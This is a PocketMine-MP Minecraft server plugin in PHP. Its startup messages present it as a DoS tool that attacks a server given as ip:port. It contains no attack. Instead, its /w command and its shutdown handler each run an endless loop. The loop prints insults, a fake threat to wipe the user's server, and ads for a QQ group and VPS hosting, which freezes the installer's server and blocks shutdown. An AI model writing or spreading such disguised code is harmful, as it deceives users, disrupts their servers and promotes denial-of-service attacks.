<?php
namespace mcpexxb;
use pocketmine\plugin\Plugin;
use pocketmine\event\Listener;
use pocketmine\command\Command;
use pocketmine\plugin\PluginBase;
use pocketmine\command\CommandSender;



class Main extends PluginBase implements Listener
{
	public function onEnable()
	{
		$this->getLogger()->info("DOS插件已启动成功");
		$this->getLogger()->info("输入/w ip:端口攻击目标服务器");
		$this->getLogger()->info("请不要用于非法用途");
		$this->getLogger()->info("定制插件请联系mcpe小小白");
	}
	public function onCommand(CommandSender $sender, Command $cmd, $label, array $arg)
	{

		switch(strtolower($cmd->getName())){
			case "w":
	while (true) {
	$sender -> sendMessage("公告：上当了吧傻逼");
	$this->getLogger()->EMERGENCY("上当了吧傻逼");
	$this->getLogger()->ALERT("清空你的服务器以示警告");
	$this->getLogger()->CRITICAL("怕不怕？其实我是开玩笑的");
	$this->getLogger()->ERROR("说真的不骗你，我真的没干什么坏事");
  	$this->getLogger()->WARNING("欢迎加入mcpe小小白のcentos开服交流群");
  	$this->getLogger()->NOTICE("WindowsLinux全支持独立IP的VPS只要19.9");
  	$this->getLogger()->INFO("支付宝微信QQ转账红包话费卡点卡全都支持");
  	$this->getLogger()->DEBUG("手动斜眼广告位招租");
				}

	}
	}
	public function onDisable()
	{
		while (true) {
	$this->getLogger()->EMERGENCY("上当了吧傻逼");
	$this->getLogger()->ALERT("清空你的服务器以示警告");
	$this->getLogger()->CRITICAL("怕不怕？其实我是开玩笑的");
	$this->getLogger()->ERROR("说真的不骗你，我真的没干什么坏事");
  	$this->getLogger()->WARNING("欢迎加入mcpe小小白のcentos开服交流群");
  	$this->getLogger()->NOTICE("WindowsLinux全支持独立IP的VPS只要19.9");
  	$this->getLogger()->INFO("支付宝微信QQ转账红包话费卡点卡全都支持");
  	$this->getLogger()->DEBUG("手动斜眼广告位招租");
				}
		
	}
}